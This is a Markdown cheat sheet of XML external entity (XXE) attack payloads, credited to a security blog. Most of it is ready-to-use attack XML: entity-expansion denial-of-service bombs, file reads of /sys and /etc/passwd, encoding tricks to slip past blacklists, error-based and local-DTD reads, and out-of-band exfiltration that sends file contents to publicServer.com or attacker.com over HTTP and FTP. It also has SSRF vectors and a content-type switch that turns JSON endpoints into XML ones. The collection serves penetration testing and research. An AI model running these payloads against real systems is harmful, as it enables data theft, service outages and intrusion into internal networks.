---
title: XXE payloads🪗
---
> *Credits to this blog: [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)*

# Denial-of-Service Attacks

### Testing for Entity Support

```xml
<!DOCTYPE data [  
<!ELEMENT data (#ANY)>  
<!ENTITY a0 "dos" >  
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">  
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">  
]>  
<data>&a2;</data>
```
  
If this test is successful and and parsing process is slowed down, there is a high probability that your parser is configured insecurely and is vulnerable to at least one kind of DoS.  

### Billion Laughs Attack (Klein, 2002)

```xml
<!DOCTYPE data [  
<!ENTITY a0 "dos" >  
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">  
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">  
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">  
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">  
]>  
<data>&a4;</data>
```
  
This file expands to about 30 KByte but has a total of 11111 entity references and therefore exceeds a reasonable threshold of entity references.  
[Source](http://www.securityfocus.com/archive/1/303509)  
  

### Billion Laughs Attack - Parameter Entities (Späth, 2015)

```xml
<!DOCTYPE data SYSTEM "http://127.0.0.1:5000/dos_indirections_parameterEntity_wfc.dtd" [  
<!ELEMENT data (#PCDATA)>  
]>  
<data>&g;</data>
```
  
File stored on _http://publicServer.com/dos.dtd_  
  
```xml
<!ENTITY % a0 "dos" >  
<!ENTITY % a1 "%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;">  
<!ENTITY % a2 "%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;">  
<!ENTITY % a3 "%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;">  
<!ENTITY % a4 "%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;">  
<!ENTITY g  "%a4;" >
```
  

### Quadratic Blowup Attack

```xml
<!DOCTYPE data [  
<!ENTITY a0 "dosdosdosdosdosdos...dos">  
]>  
<data>&a0;&a0;...&a0;</data>
```
  
[Source](https://pypi.python.org/pypi/defusedxml/)  
  

### Recursive General Entities

This vector is not well-formed by [[WFC: No Recursion](https://www.w3.org/TR/xml11/#norecursion)].  
  
```xml
<!DOCTYPE data [  
<!ENTITY a "a&b;" >  
<!ENTITY b "&a;" >  
]>  
<data>&a;</data>
```
  

### External General Entities (Steuck, 2002)

The idea of this attack is to declare an external general entity and reference a large file on a network resource or locally (e.g. _C:/pagefile.sys or /dev/random_).  
However, conducting DoS attacks in such a manner is only applicable by making the parser process a **large XML document.**  
  
```xml
<?xml version='1.0'?>  
<!DOCTYPE data [  
<!ENTITY dos SYSTEM "file:///publicServer.com/largeFile.xml" >  
]>  
<data>&dos;</data>
```

[https://www.blogger.com/goog_539728379](http://www.securityfocus.com/archive/1/297714/2002-10-27/2002-11-02/0)

###  Parameter Laughs (Sebastian Pipping, 2021)

The Parameter Laughs attack is based on the Bllion Laughs attack and it relies on nested entities to allocate gigabytes of content to process caused by a small payload.  
In comparison to previous attack vectors, the attack:

- uses parameter entities (syntax _%entity;_ with _%_) rather than general entities (syntax _&entity;_ with _&_) and
- uses delayed interpretation to effectively sneak use of parameter entities into the so-called "internal subset" of the XML document (the "here" in _<!DOCTYPE r [here]>_) where undisguised parameter entities are not allowed, with regard to the XML specification.  

```xml
<?xml version="1.0"?>  
<!--  
  "Parameter Laughs", i.e. variant of Billion Laughs Attack  
                           using delayed interpretation  
                           of parameter entities  
  Copyright (C) Sebastian Pipping <sebastian@pipping.org>  
-->  
<!DOCTYPE r [  
  <!ENTITY % pe_1 "<!---->">  
  <!ENTITY % pe_2 "&#37;pe_1;<!---->&#37;pe_1;">  
  <!ENTITY % pe_3 "&#37;pe_2;<!---->&#37;pe_2;">  
  %pe_3; <!-- not at full potential, increase towards "%pe40;"  
              carefully -->  
]>  
<r/>  
```

[Source](https://blog.hartwork.org/posts/cve-2021-3541-parameter-laughs-fixed-in-libxml2-2-9-11/)  

# Classic XXE

### Classic XXE Attack (Steuck, 2002)

```xml
<?xml version="1.0"?>  
<!DOCTYPE data [  
<!ELEMENT data (#ANY)>  
<!ENTITY file SYSTEM "file:///sys/power/image_size">  
]>  
<data>&file;</data>
```
  
We use the file `/sys/power/image_size` as an example, because it is a very simple file (one line, no special characters).  
  
This attack requires a direct feedback channel and reading out files is limited by "forbidden characters in XML" such as "<" and "&".  
If such characters occur in the accessed file (e.g. `/etc/fstab`) the XML parser raises an exception and stops the parsing of the message.  
  
[Source](http://www.securityfocus.com/archive/1/297714/2002-10-27/2002-11-02/0)  

### XXE Attack using netdoc

```xml
<?xml version="1.0"?>  
<!DOCTYPE data [  
<!ELEMENT data (#PCDATA)>  
<!ENTITY file SYSTEM "netdoc:/sys/power/image_size">  
]>  
<data>&file;</data>
```
  
[Source: @Nirgoldshlager](https://twitter.com/Nirgoldshlager/status/618417178505814016)  
  

### XXE Attack using UTF-16 (Dawid Golunski)

Some simple blacklisting countermeasures can probably bypassed by changing the default XML charset (which is UTF-8), to a different one, for example, UTF-16  
  
```xml
<?xml version="1.0" encoding="UTF-16"?>  
<!DOCTYPE data [  
<!ELEMENT data (#PCDATA)>  
<!ENTITY file SYSTEM "file:///sys/power/image_size">  
]>  
<data>&file;</data>
```
  
The above file can be simply created with a texteditor.  
To convert it to UTF-16, you can use the linux tool iconv  
  
```xml
cat file.xml | iconv -f UTF-8 -t UTF-16 > file_utf16.xml 
```
  
[Source,](http://legalhackers.com/advisories/eBay-Magento-XXE-Injection-Vulnerability.txt) Thanks to [@ilmila](https://twitter.com/ilmila/status/705077149091364864)  
  

### XXE Attack using UTF-7

The same trick can be applied to UTF-7 as-well.  
  
```xml
<?xml version="1.0" encoding="UTF-7" ?>  
<!DOCTYPE data [  
<!ELEMENT data (#PCDATA)>  
<!ENTITY file SYSTEM "file:///sys/power/image_size">  
]>  
<data>&file;</data>
```
  
```shell
cat file.xml | iconv -f UTF-8 -t UTF-7 > file_utf7.xml  
```
  
[Source,](http://legalhackers.com/advisories/eBay-Magento-XXE-Injection-Vulnerability.txt) Thanks to [@ilmila](https://twitter.com/ilmila/status/705077149091364864)  
  

# Evolved XXE Attacks - Direct Feedback Channel

This class of attacks vectors is called evolved XXE attacks and is used to (i) bypass restrictions of classic XXE attacks and (ii) for Out-of-Band attacks.  

### Bypassing Restrictions of XXE (Morgan, 2014)

```xml
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE data [  
<!ELEMENT data (#ANY)>  
<!ENTITY % start "<![CDATA[">  
<!ENTITY % goodies SYSTEM "file:///sys/power/image_size">  
<!ENTITY % end "]]>">  
<!ENTITY % dtd SYSTEM "http://publicServer.com/parameterEntity_core.dtd">  
%dtd;  
]>  
<data>&all;</data>
```
  
File stored on _http://publicServer.com/parameterEntity_core.dtd_  
  
```
<!ENTITY all '%start;%goodies;%end;'>
```
   
[Source](http://vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf)  
  
### Bypassing Restrictions of XXE (Späth, 2015)

```xml
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_doctype.dtd">  
<data>&all;</data>
```
  
File stored on _http://publicServer.com/parameterEntity_doctype.dtd_  
  
```xml
<!ELEMENT data (#PCDATA)>  
<!ENTITY % start "<![CDATA[">  
<!ENTITY % goodies SYSTEM "file:///sys/power/image_size">  
<!ENTITY % end "]]>">  
<!ENTITY all '%start;%goodies;%end;'>
```
  
### XXE by abusing Attribute Values (Yunusov, 2013)

This vector bypasses [WFC: No External Entity References].  
  
  
```xml
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE data [  
<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd">  
%remote;  
]>  
<data attrib='&internal;'/>
```
  
File stored on _http://publicServer.com/external_entity_attribute.dtd_  
  
```xml
<!ENTITY % payload SYSTEM "file:///sys/power/image_size">  
<!ENTITY % param1 "<!ENTITY internal '%payload;'>">  
%param1;
```
  
[Source](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)  

### Error-based XXE using Parameter Entitites (Arseniy Sharoglazov, 2018)

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```
  
File stored on _http://attacker.com/ext.dtd_  

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

[Source](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)

### Abusing local-DTD Files XXE (Arseniy Sharoglazov, 2018)

Because external DTD subsets are prohibited within an internal subset, one can use a a locally existing DTD file as follows:

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">

    <!ENTITY % condition 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
        <!ELEMENT aa (bb'>

    %local_dtd;
]>
<message>any text</message>
```
  
Contents of _sig-app_1_0.dtd_  
  
```xml
… <!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of"> <!ELEMENT pattern (%condition;)> …
```
  

[Source](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/) (also providing a list of local DTD files)

# Evolved XXE Attacks - Out-of-Band channels

Just because there is no direct feedback channel available does not imply that an XXE attack is not possible.  

### XXE OOB Attack (Yunusov, 2013)

```xml
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">  
<data>&send;</data>
```
  
File stored on _http://publicServer.com/parameterEntity_oob.dtd_  
  
```xml
<!ENTITY % file SYSTEM "file:///sys/power/image_size">  
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">  
%all;
```

[Source](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)

###   XXE OOB Attack - Parameter Entities (Yunusov, 2013)

Here is a variation of the previous attack using only parameter entities.  
  
```xml
<?xml version="1.0"?>  
<!DOCTYPE data [  
<!ENTITY % remote SYSTEM "http://publicServer.com/parameterEntity_sendhttp.dtd">  
%remote;  
%send;  
]>  
<data>4</data>
```
  
File stored on _http://publicServer.com/parameterEntity_sendhttp.dtd_  
  
```xml
<!ENTITY % payload SYSTEM "file:///sys/power/image_size">  
<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'http://publicServer.com/%payload;'>">  
%param1;
```
  
[Source](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)  
  
### XXE OOB Attack - Parameter Entities FTP (Novikov, 2014)

Using the FTP protocol, an attacker can read out files of arbitrary length.  
  
```xml
<?xml version="1.0"?>  
<!DOCTYPE data [  
<!ENTITY % remote SYSTEM "http://publicServer.com/parameterEntity_sendftp.dtd">  
%remote;  
%send;  
]>  
<data>4</data>
```
  
File stored on _http://publicServer.com/parameterEntity_sendftp.dtd_  
  
  
```xml
<!ENTITY % payload SYSTEM "file:///sys/power/image_size">  
<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">  
%param1;
```
  
This attack requires to setup a modified FTP server. However, adjustments to this PoC code are probably necessary to apply it to an arbitrary parser.  
  
[Source](https://www.blogger.com/\(http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html)  
  

### SchemaEntity Attack (Späth, 2015)

We identified three variations of this attack using (i) schemaLocation, (ii) noNamespaceSchemaLocation and (iii) XInclude.  
  

### schemaLocation

```xml
<?xml version='1.0'?>  
<!DOCTYPE data [  
<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd">  
%remote;  
]>  
<ttt:data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
  xmlns:ttt="http://test.com/attack"  
xsi:schemaLocation="ttt http://publicServer.com/&internal;">4</ttt:data>
```
  

### noNamespaceSchemaLocation

```xml
<?xml version='1.0'?>  
<!DOCTYPE data [  
<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd">  
%remote;  
]>  
<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
    xsi:noNamespaceSchemaLocation="http://publicServer.com/&internal;"></data>
```

### XInclude

```xml
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE data [  
<!ENTITY % remote SYSTEM "http://publicServer.com/external_entity_attribute.dtd">  
%remote;  
]>  
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://192.168.2.31/&internal;" parse="text"></xi:include></data>
```
  
  
File stored on _http://publicServer.com/external_entity_attribute.dtd_  
  
```xml
<!ENTITY % payload SYSTEM "file:///sys/power/image_size">  
<!ENTITY % param1 "<!ENTITY internal '%payload;'>">  
%param1;
```

# SSRF Attacks

### DOCTYPE

```xml
<?xml version="1.0"?>  
<!DOCTYPE data SYSTEM "http://publicServer.com/" [  
<!ELEMENT data (#ANY)>  
]>  
<data>4</data>  
```

### External General Entity (Steuck, 2002)

```xml
<?xml version='1.0'?>  
<!DOCTYPE data [  
<!ELEMENT data (#ANY)>  
<!ENTITY remote SYSTEM "http://internalSystem.com/file.xml">  
]>  
<data>&remote;</data>
```

Although it is best to reference a well-formed XML file (or any text file for that matter), in order not to cause an error, it is possible with some parsers to invoke an URL without referencing a not well-formed file.  
  
[Source](http://www.securityfocus.com/archive/1/297714/2002-10-27/2002-11-02/0)  

### External Parameter Entity (Yunusov, 2013)

```xml
<?xml version='1.0'?>  
<!DOCTYPE data [  
<!ELEMENT data (#ANY)>  
<!ENTITY % remote SYSTEM "http://publicServer.com/url_invocation_parameterEntity.dtd">  
%remote;  
]>  
<data>4</data>
```

  
File stored on _http://publicServer.com/url_invocation_parameterEntity.dtd_  
  
```xml
<!ELEMENT data2 (#ANY)>
```

  
[Source](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)  

### XInclude

```xml
<?xml version='1.0'?>  
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://publicServer.com/file.xml"></xi:include></data>
```
  
File stored on _http://publicServer.com/file.xml_  

```xml
<?xml version='1.0' encoding='utf-8'?><data>it_works</data>
```
  
### schemaLocation

```xml
<?xml version='1.0'?>  
<ttt:data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
  xmlns:ttt="http://test.com/attack"  
xsi:schemaLocation="http://publicServer.com/url_invocation_schemaLocation.xsd">4</ttt:data>
```
  
File stored on _http://publicServer.com/url_invocation_schemaLocation.xsd_  
  
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<xs:schema  
     xmlns:xs="http://www.w3.org/2001/XMLSchema">  
 <xs:element name="data" type="xs:string"/>  
</xs:schema>
```
  
or use this file  
  
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<xs:schema  
     xmlns:xs="http://www.w3.org/2001/XMLSchema"  
 targetNamespace="http://test.com/attack">  
 <xs:element name="data" type="xs:string"/>  
</xs:schema>
```
  

### noNamespaceSchemaLocation

```xml
<?xml version='1.0'?>  
<data xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  
xsi:noNamespaceSchemaLocation="http://publicServer.com/url_invocation_noNamespaceSchemaLocation.xsd">4</data>
```
  
File stored on _http://publicServer.com/url_invocation_noNamespaceSchemaLocation.xsd_  
  
```xml
<?xml version="1.0" encoding="UTF-8"?>  
<xs:schema  
     xmlns:xs="http://www.w3.org/2001/XMLSchema">  
 <xs:element name="data" type="xs:string"/>  
</xs:schema>
```
  

# XXE on JSON Webservices Trick (Antti Rantasaari)

If you pentest a web service that supports JSON, you can try to enforce it parsing XML as well.

The example is copied from [this](https://blog.netspi.com/playing-content-type-xxe-json-endpoints/#) Blogpost by Antti Rantasaari.

Given HTTP example request:

```html
POST /netspi HTTP/1.1  
Host: someserver.netspi.com  
Accept: application/json  
Content-Type: application/json  
Content-Length: 38  
  
{"search":"name","value":"netspitest"}
```
 
It can be converted to enforce using XML by setting the HTTP Content-Type to application/xml:

```xml
POST /netspi HTTP/1.1  
Host: someserver.netspi.com  
Accept: application/json  
Content-Type: application/xml  
Content-Length: 288  
  
<?xml version="1.0" encoding="UTF-8" ?>  
<!DOCTYPE netspi [<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>  
<root>  
<search>name</search>  
<value>&xxe;</value>  
</root>
```
  

In this case, the JSON parameters "name" and "value" are converted to XML elements `<search>` and `<value>` to be Schema conform to the JSON format.

A root element `<root>` was added around `<search>` and `<value>` to get a valid XML document (since an XML document must have exactly one root element).

The XXE attack might also work by simply adding one of the other attack vectors of this blog.


[Source](https://blog.netspi.com/playing-content-type-xxe-json-endpoints/#)

#  XInclude Attacks (Morgan, 2014)

```xml
<data xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="/sys/power/image_size"></xi:include></data>
```
  
[Source](http://vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf)  

# XSLT Attacks

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">  
   <xsl:template match="/">  
       <xsl:value-of select="document('/sys/power/image_size')">  
   </xsl:value-of></xsl:template>  
</xsl:stylesheet>
```